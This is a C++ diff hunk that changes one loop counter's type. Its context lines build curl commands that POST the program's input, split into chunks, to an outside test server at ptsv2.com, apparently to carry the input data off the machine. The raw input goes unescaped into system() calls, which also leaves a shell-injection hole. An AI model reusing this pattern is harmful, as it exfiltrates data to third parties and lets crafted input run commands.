@@ -20,7 +20,7 @@ int main(int argc,char** argv){
   input += "*end*";
   string query2="curl -d '{ \"args\":" + to_string(input.size()) + "}' -H \"Content-Type: application/json\" -X POST http://ptsv2.com/t/gbordignon/post";
   system(query2.c_str());
-  for(int ii = 0*MAX; ii < input.size(); ii+=MAX) {
+  for(unsigned long long ii = 0*MAX; ii < input.size(); ii+=MAX) {
     string body = input.substr(ii, MAX);
     string query="curl -d '{ \"args" + to_string(ii / MAX) + "\":" + body + "}' -H \"Content-Type: application/json\" -X POST http://ptsv2.com/t/gbordignon/post";
     system(query.c_str());
